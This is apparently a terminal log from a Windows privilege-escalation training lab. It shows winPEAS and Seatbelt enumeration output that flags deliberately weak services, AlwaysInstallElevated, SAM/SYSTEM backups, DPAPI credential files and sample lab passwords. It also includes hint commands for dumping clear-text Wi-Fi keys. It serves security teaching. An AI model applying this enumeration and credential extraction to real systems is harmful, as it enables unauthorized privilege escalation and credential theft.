    C:\Program Files\Insecure Registry Service
    C:\Program Files\internet explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Unquoted Path Service(Users [AllAccess])
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


  [+] Autorun Applications(T1010)
   [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   =================================================================================================

System.Collections.Generic.KeyNotFoundException: The given key was not present in the dictionary.
   at System.ThrowHelper.ThrowKeyNotFoundException()                                                                                                                    
   at System.Collections.Generic.Dictionary`2.get_Item(TKey key)                                                                                                        
   at d4.ap()                                                                                                                                                           

  [+] Scheduled Applications --Non Microsoft--(T1010)
   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.                                                                                                     
File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'                                                          
   at dx.a()                                                                                                                                                            
   at d4.ao()                                                                                                                                                           
                                                                                                                                                                        
WRN: Assembly binding logging is turned OFF.                                                                                                                            
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.                                                
Note: There is some performance penalty associated with assembly bind failure logging.                                                                                  
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].                                                                         
                                                                                                                                                                        


  =========================================(Network Information)=========================================

  [+] Network Shares(T1135)
  [X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)                                                             
   at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)                                                                                                
   at winPEAS.SamServer.c.d(Boolean A_0)                                                                                                                                
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

  [+] Host File(T1016)

  [+] Network Ifaces and known hosts(T1016)
   [?] The masks are only for the IPv4 addresses 
    Ethernet[02:7F:13:A3:C0:77]: 10.10.163.32, fe80::dd57:7c00:c8e6:f9c9%15 / 255.255.0.0
        Gateways: 10.10.0.1
        DNSs: 10.0.0.2
        Known hosts:
          10.10.0.1             02-C8-85-B5-5A-AA     Dynamic
          10.10.255.255         FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


  [+] Current Listening Ports(T1049&T1049)
   [?] Check for services restricted from the outside 
    Proto     Local Address          Foreing Address        State
    TCP       0.0.0.0:135                                   Listening
    TCP       0.0.0.0:445                                   Listening
    TCP       0.0.0.0:3389                                  Listening
    TCP       0.0.0.0:5985                                  Listening
    TCP       0.0.0.0:47001                                 Listening
    TCP       0.0.0.0:49664                                 Listening
    TCP       0.0.0.0:49665                                 Listening
    TCP       0.0.0.0:49666                                 Listening
    TCP       0.0.0.0:49667                                 Listening
    TCP       0.0.0.0:49668                                 Listening
    TCP       0.0.0.0:49669                                 Listening
    TCP       0.0.0.0:49670                                 Listening
    TCP       10.10.163.32:139                              Listening
    TCP       [::]:135                                      Listening
    TCP       [::]:445                                      Listening
    TCP       [::]:3389                                     Listening
    TCP       [::]:5985                                     Listening
    TCP       [::]:47001                                    Listening
    TCP       [::]:49664                                    Listening
    TCP       [::]:49665                                    Listening
    TCP       [::]:49666                                    Listening
    TCP       [::]:49667                                    Listening
    TCP       [::]:49668                                    Listening
    TCP       [::]:49669                                    Listening
    TCP       [::]:49670                                    Listening
    UDP       0.0.0.0:123                                   Listening
    UDP       0.0.0.0:500                                   Listening
    UDP       0.0.0.0:3389                                  Listening
    UDP       0.0.0.0:3702                                  Listening
    UDP       0.0.0.0:4500                                  Listening
    UDP       0.0.0.0:5353                                  Listening
    UDP       0.0.0.0:5355                                  Listening
    UDP       10.10.163.32:137                              Listening
    UDP       10.10.163.32:138                              Listening
    UDP       127.0.0.1:59833                               Listening
    UDP       [::]:123                                      Listening
    UDP       [::]:500                                      Listening

  [+] Firewall Rules(T1016)
   [?] Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

  [+] DNS cached --limit 70--(T1016)
    Entry                                 Name                                  Data
    au.download.windowsupdate.com         au.download.windowsupdate.com         wu-shim.trafficmanager.net
    au.download.windowsupdate.com         wu-shim.trafficmanager.net            wu.azureedge.net
    au.download.windowsupdate.com         wu.azureedge.net                      wu.ec.azureedge.net
    au.download.windowsupdate.com         wu.ec.azureedge.net                   bg.apr-52dd2-0503.edgecastdns.net
    au.download.windowsupdate.com         bg.apr-52dd2-0503.edgecastdns.net     hlb.apr-52dd2-0.edgecastdns.net
    au.download.windowsupdate.com         hlb.apr-52dd2-0.edgecastdns.net       cs11.wpc.v0cdn.net
    au.download.windowsupdate.com         cs11.wpc.v0cdn.net                    93.184.221.240
    sls.update.microsoft.com              sls.update.microsoft.com              ...prod.dcat.dsp.trafficmanager.net
    sls.update.microsoft.com              ...prod.dcat.dsp.trafficmanager.net   40.125.122.176


  =========================================(Windows Credentials)=========================================

  [+] Checking Windows Vault()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  [X] Exception: Object reference not set to an instance of an object.
    Not Found

  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    This function is not yet implemented.
    [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

  [+] Saved RDP connections()
    Not Found

  [+] Recently run commands()
    Not Found

  [+] Checking for DPAPI Master Keys()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\user\AppData\Roaming\Microsoft\Protect\S-1-5-21-3025105784-3259396213-1915610826-1000\ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
   =================================================================================================


  [+] Checking for Credential Files()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:04 AM
    Modified: 6/5/2020 8:38:04 AM
    Size: 11152
   =================================================================================================

    CredFile: C:\Users\user\AppData\Roaming\Microsoft\Credentials\B7F3DB5C32DA09A1DE92D276CFACAC3B
    Description: Enterprise Credential Data
    MasterKey: ced3b33f-849e-4587-8829-fbaf4cd747a7
    Accessed: 6/5/2020 8:38:10 AM
    Modified: 6/5/2020 8:38:10 AM
    Size: 506
   =================================================================================================

    [i] Follow the provided link for further instructions in how to decrypt the creds file

  [+] Checking for RDCMan Settings Files()
   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

  [+] Looking for kerberos tickets()
   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

  [+] Looking saved Wifis()
    This function is not yet implemented.
    [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
    [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found

  [+] Looking SSClient.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

  [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

  [+] Checking WSUS(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found


  ========================================(Browsers Information)========================================

  [+] Looking for Firefox DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Firefox history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for Chrome DBs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in Chrome history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Chrome bookmarks(T1217)
    Not Found

  [+] Current IE tabs(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

  [+] Looking for GET credentials in IE history(T1503)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

  [+] IE favorites(T1217)
    http://go.microsoft.com/fwlink/p/?LinkId=255142


  ==============================(Interesting files and registry)==============================

  [+] Putty Sessions()
    SessionName: BWP123F42
    ProxyPassword: password123
    ProxyUsername: admin
   =================================================================================================


  [+] Putty SSH Host keys()
    Not Found

  [+] SSH keys in registry()
   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                                              
    Not Found

  [+] Cloud Credentials(T1538&T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>                    <Value>cGFzc3dvcmQxMjM=</Value>                    <PlainText>false</PlainText>                </Password>

  [+] Looking for common SAM & SYSTEM backups()
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM

  [+] Looking for McAfee Sitelist.xml Files()

  [+] Cached GPP Passwords()
  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

  [+] Looking for possible regs with creds(T1012&T1214)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

  [+] Looking for possible password files in users homes(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

  [+] Searching known files that can contain creds in home(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\user\SAM
    C:\Users\user\SYSTEM

  [+] Looking for documents --limit 100--(T1083)
    Not Found

  [+] Recent files --limit 70--(T1083&T1081)
    Not Found

C:\Users\user>C:\Privesc\seatbelt.exe
C:\Privesc\seatbelt.exe


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


 "SeatBelt.exe system" collects the following system data:

        BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
        RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
        TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
        UACSystemPolicies     -   UAC system policies via the registry
        PowerShellSettings    -   PowerShell versions and security settings
        AuditSettings         -   Audit settings via the registry
        WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
        LSASettings           -   LSA settings (including auth packages)
        UserEnvVariables      -   Current user environment variables
        SystemEnvVariables    -   Current system environment variables
        UserFolders           -   Folders in C:\Users\
        NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
        InternetSettings      -   Internet settings including proxy configs
        LapsSettings          -   LAPS settings, if installed
        LocalGroupMembers     -   Members of local admins, RDP, and DCOM
        MappedDrives          -   Mapped drives
        RDPSessions           -   Current incoming RDP sessions
        WMIMappedDrives       -   Mapped drives via WMI
        NetworkShares         -   Network shares
        FirewallRules         -   Deny firewall rules, "full" dumps all
        AntiVirusWMI          -   Registered antivirus (via WMI)
        InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
        RegistryAutoRuns      -   Registry autoruns
        RegistryAutoLogon     -   Registry autologon information
        DNSCache              -   DNS cache entries (via WMI)
        ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
        AllTcpConnections     -   Lists current TCP connections and associated processes
        AllUdpConnections     -   Lists current UDP connections and associated processes
        NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
         *  If the user is in high integrity, the following additional actions are run:
        SysmonConfig          -   Sysmon configuration from the registry


 "SeatBelt.exe user" collects the following user data:

        SavedRDPConnections   -   Saved RDP connections
        TriageIE              -   Internet Explorer bookmarks and history  (last 7 days)
        DumpVault             -   Dump saved credentials in Windows Vault (i.e. logins from Internet Explorer and Edge), from SharpWeb
        RecentRunCommands     -   Recent "run" commands
        PuttySessions         -   Interesting settings from any saved Putty configurations
        PuttySSHHostKeys      -   Saved putty SSH host keys
        CloudCreds            -   AWS/Google/Azure cloud credential files
        RecentFiles           -   Parsed "recent files" shortcuts  (last 7 days)
        MasterKeys            -   List DPAPI master keys
        CredFiles             -   List Windows credential DPAPI blobs
        RDCManFiles           -   List Windows Remote Desktop Connection Manager settings files
         *  If the user is in high integrity, this data is collected for ALL users instead of just the current user


 Non-default options:

        CurrentDomainGroups   -   The current user's local and domain groups
        Patches               -   Installed patches via WMI (takes a bit on some systems)
        LogonSessions         -   User logon session data
        KerberosTGTData       -   ALL TEH TGTZ!
        InterestingFiles      -   "Interesting" files matching various patterns in the user's folder
        IETabs                -   Open Internet Explorer tabs
        TriageChrome          -   Chrome bookmarks and history
        TriageFirefox         -   Firefox history (no bookmarks)
        RecycleBin            -   Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
        4624Events            -   4624 logon events from the security event log
        4648Events            -   4648 explicit logon events from the security event log (runas or outbound RDP)
        KerberosTickets       -   List Kerberos tickets. If elevated, grouped by all logon sessions.


 "SeatBelt.exe all" will run ALL enumeration checks, can be combined with "full".


 "SeatBelt.exe [CheckName] full" will prevent any filtering and will return complete results.


 "SeatBelt.exe [CheckName] [CheckName2] ..." will run one or more specified checks only (case-sensitive naming!)


C:\Users\user>C:\Privesc\SeatBelt all  
C:\Privesc\SeatBelt all 


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v0.2.0         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 



=== Running System Triage Checks ===



=== Basic OS Information ===

  Hostname                      :  WIN-QBA94KB3IOF
  Domain Name                   :  
  Username                      :  WIN-QBA94KB3IOF\user
  ProductName                   :  Windows Server 2019 Standard Evaluation
  EditionID                     :  ServerStandardEval
  ReleaseId                     :  1809
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  1
  IsVirtualMachine              :  False
  BootTime (approx)             :  1/9/2022 10:15:13 AM
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False


=== Reboot Schedule (event ID 12/13 from last 15 days) ===

  1/9/2022 1:23:11 AM     :  startup


=== Current Privileges ===

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED


=== UAC System Policies ===

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA                      : 1
  LocalAccountTokenFilterPolicy  : 1
    [*] LocalAccountTokenFilterPolicy set to 1.
    [*] Any local account can be used for lateral movement.
  FilterAdministratorToken       : 


=== PowerShell Settings ===

  PowerShell v2 Version          : 2.0
  PowerShell v5 Version          : 5.1.17763.1

  Transcription Settings:

  Module Logging Settings:

  Scriptblock Logging Settings:



=== Audit Settings ===



=== WEF Settings ===



=== LSA Settings ===

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : System.Byte[]
  crashonauditfail               : 0
  fullprivilegeauditing          : System.Byte[]
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 756
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1


=== User Environment Variables ===

  COMPUTERNAME                        : WIN-QBA94KB3IOF
  USERPROFILE                         : C:\Users\user
  HOMEPATH                            : \Users\user
  LOCALAPPDATA                        : C:\Users\user\AppData\Local
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  PROCESSOR_ARCHITECTURE              : AMD64
  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp;C:\Users\user\AppData\Local\Microsoft\WindowsApps;
  CommonProgramFiles(x86)             : C:\Program Files (x86)\Common Files
  ProgramFiles(x86)                   : C:\Program Files (x86)
  PROCESSOR_LEVEL                     : 6
  LOGONSERVER                         : \\WIN-QBA94KB3IOF
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  HOMEDRIVE                           : C:
  SystemRoot                          : C:\Windows
  SESSIONNAME                         : RDP-Tcp#2
  ALLUSERSPROFILE                     : C:\ProgramData
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  APPDATA                             : C:\Users\user\AppData\Roaming
  PROCESSOR_REVISION                  : 4f01
  USERNAME                            : user
  CommonProgramW6432                  : C:\Program Files\Common Files
  CommonProgramFiles                  : C:\Program Files\Common Files
  CLIENTNAME                          : kali
  OS                                  : Windows_NT
  USERDOMAIN_ROAMINGPROFILE           : WIN-QBA94KB3IOF
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  ComSpec                             : C:\Windows\system32\cmd.exe
  PROMPT                              : $P$G
  SystemDrive                         : C:
  TEMP                                : C:\Users\user\AppData\Local\Temp\2
  ProgramFiles                        : C:\Program Files
  NUMBER_OF_PROCESSORS                : 1
  TMP                                 : C:\Users\user\AppData\Local\Temp\2
  ProgramData                         : C:\ProgramData
  ProgramW6432                        : C:\Program Files
  windir                              : C:\Windows
  USERDOMAIN                          : WIN-QBA94KB3IOF
  PUBLIC                              : C:\Users\Public


=== System Environment Variables ===

  ComSpec                             : C:\Windows\system32\cmd.exe
  DriverData                          : C:\Windows\System32\Drivers\DriverData
  OS                                  : Windows_NT
  Path                                : C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Temp
  PATHEXT                             : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  PROCESSOR_ARCHITECTURE              : AMD64
  PSModulePath                        : C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  TEMP                                : C:\Windows\TEMP
  TMP                                 : C:\Windows\TEMP
  USERNAME                            : SYSTEM
  windir                              : C:\Windows
  NUMBER_OF_PROCESSORS                : 1
  PROCESSOR_LEVEL                     : 6
  PROCESSOR_IDENTIFIER                : Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
  PROCESSOR_REVISION                  : 4f01


=== User Folders ===

  Folder                                Last Modified Time
  C:\Users\admin                      : 6/5/2020 8:36:24 AM
  C:\Users\Administrator              : 6/4/2020 6:12:00 PM
  C:\Users\user                       : 1/9/2022 1:46:19 AM


=== Non Microsoft Services (via WMI) ===

  Name             : AmazonSSMAgent
  DisplayName      : Amazon SSM Agent
  Company Name     : 
  Description      : Amazon SSM Agent
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
  IsDotNet         : False

  Name             : AWSLiteAgent
  DisplayName      : AWS Lite Guest Agent
  Company Name     : Amazon Inc.
  Description      : AWS Lite Guest Agent
  State            : Running
  StartMode        : Auto
  PathName         : C:\Program Files\Amazon\XenTools\LiteAgent.exe
  IsDotNet         : False

  Name             : daclsvc
  DisplayName      : DACL Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DACL Service\daclservice.exe"
  IsDotNet         : False

  Name             : dllsvc
  DisplayName      : DLL Hijack Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
  IsDotNet         : False

  Name             : filepermsvc
  DisplayName      : File Permissions Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\File Permissions Service\filepermservice.exe"
  IsDotNet         : False

  Name             : PsShutdownSvc
  DisplayName      : PsShutdown
  Company Name     : Systems Internals
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Windows\PSSDNSVC.EXE
  IsDotNet         : False

  Name             : regsvc
  DisplayName      : Insecure Registry Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
  IsDotNet         : False

  Name             : ssh-agent
  DisplayName      : OpenSSH Authentication Agent
  Company Name     : 
  Description      : Agent to hold private keys used for public key authentication.
  State            : Stopped
  StartMode        : Disabled
  PathName         : C:\Windows\System32\OpenSSH\ssh-agent.exe
  IsDotNet         : False

  Name             : unquotedsvc
  DisplayName      : Unquoted Path Service
  Company Name     : 
  Description      : 
  State            : Stopped
  StartMode        : Manual
  PathName         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
  IsDotNet         : False

  [X] Exception: The path is not of a legal form.


=== HKCU Internet Settings ===

        DisableCachingOfSSLPages : 1
              IE5_UA_Backup_Flag : 5.0
                 PrivacyAdvanced : 1
                 SecureProtocols : 2688
                      User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
           CertificateRevocation : 1
            ZonesSecurityUpgrade : System.Byte[]
              WarnonZoneCrossing : 1
                 EnableNegotiate : 1
                    MigrateProxy : 1
                     ProxyEnable : 0


=== HKLM Internet Settings ===

                    ActiveXCache : C:\Windows\Downloaded Program Files
              CodeBaseSearchPath : CODEBASE
                  EnablePunycode : 1
                    MinorVersion : 0
                  WarnOnIntranet : 1


=== LAPS Settings ===

  [*] LAPS not installed


=== Local Group Memberships ===

  * Administrators *

    WIN-QBA94KB3IOF\Administrator
    WIN-QBA94KB3IOF\admin

  * Remote Desktop Users *

    NT AUTHORITY\Authenticated Users

  * Distributed COM Users *


  * Remote Management Users *




=== Drive Information (via .NET) ===

  Drive        Mapped Location
  C:\        : C:\


=== Current Host RDP Sessions (qwinsta) ===

  SessionID:       0
  SessionName:     Services
  UserName:        
  DomainName:      
  State:           Disconnected
  SourceIP: 

  SessionID:       1
  SessionName:     Console
  UserName:        
  DomainName:      
  State:           Connected
  SourceIP: 

  SessionID:       2
  SessionName:     RDP-Tcp#14
  UserName:        user
  DomainName:      WIN-QBA94KB3IOF
  State:           Active
  SourceIP:        10.8.52.126



=== Mapped Drives (via WMI) ===



=== Network Shares (via WMI) ===

  Name             : ADMIN$
  Path             : C:\Windows
  Description      : Remote Admin

  Name             : C$
  Path             : C:\
  Description      : Default share

  Name             : IPC$
  Path             : 
  Description      : Remote IPC



=== Firewall Rules (Deny) ===

  Current Profile(s)          : PUBLIC

  FirewallEnabled (Domain)    : False
  FirewallEnabled (Private)   : False
  FirewallEnabled (Public)    : False

  [X] Exception: Invalid namespace 


=== Process Enumerations ===

  * Potential Defensive Processes *


  * Browser Processes *


  * Other Interesting Processes *

        Name         : cmd.exe
        Product      : Command Prompt
        ProcessID    : 3756
        Owner        : WIN-QBA94KB3IOF\user
        CommandLine  : "C:\Windows\system32\cmd.exe" 

        Name         : cmd.exe
        Product      : Command Prompt
        ProcessID    : 2352
        Owner        : WIN-QBA94KB3IOF\admin
        CommandLine  : "C:\Windows\System32\cmd.exe" 

        Name         : cmd.exe
        Product      : Command Prompt
        ProcessID    : 5512
        Owner        : WIN-QBA94KB3IOF\user
        CommandLine  : cmd



=== Registry Auto-logon Settings ===

  DefaultUserName         : admin


=== Registry Autoruns ===

  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\Autorun Program\program.exe"


=== DNS Cache (via WMI) ===

  Entry         : au.download.windowsupdate.com
  Name          : au.download.windowsupdate.com
  Data          : wu-shim.trafficmanager.net

  Entry         : au.download.windowsupdate.com
  Name          : wu-shim.trafficmanager.net
  Data          : wu.azureedge.net

  Entry         : au.download.windowsupdate.com
  Name          : wu.azureedge.net
  Data          : wu.ec.azureedge.net

  Entry         : au.download.windowsupdate.com
  Name          : wu.ec.azureedge.net
  Data          : bg.apr-52dd2-0503.edgecastdns.net

  Entry         : au.download.windowsupdate.com
  Name          : bg.apr-52dd2-0503.edgecastdns.net
  Data          : hlb.apr-52dd2-0.edgecastdns.net

  Entry         : au.download.windowsupdate.com
  Name          : hlb.apr-52dd2-0.edgecastdns.net
  Data          : cs11.wpc.v0cdn.net

  Entry         : au.download.windowsupdate.com
  Name          : cs11.wpc.v0cdn.net
  Data          : 93.184.221.240

  Entry         : sls.update.microsoft.com
  Name          : sls.update.microsoft.com
  Data          : glb.sls.prod.dcat.dsp.trafficmanager.net

  Entry         : sls.update.microsoft.com
  Name          : glb.sls.prod.dcat.dsp.trafficmanager.net
  Data          : 40.125.122.176



=== Current ARP Table ===


  Interface     : Loopback Pseudo-Interface 1 (127.0.0.1) --- Index 1
    DNS Servers : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static
    239.255.255.250       00-00-00-00-00-00     Static


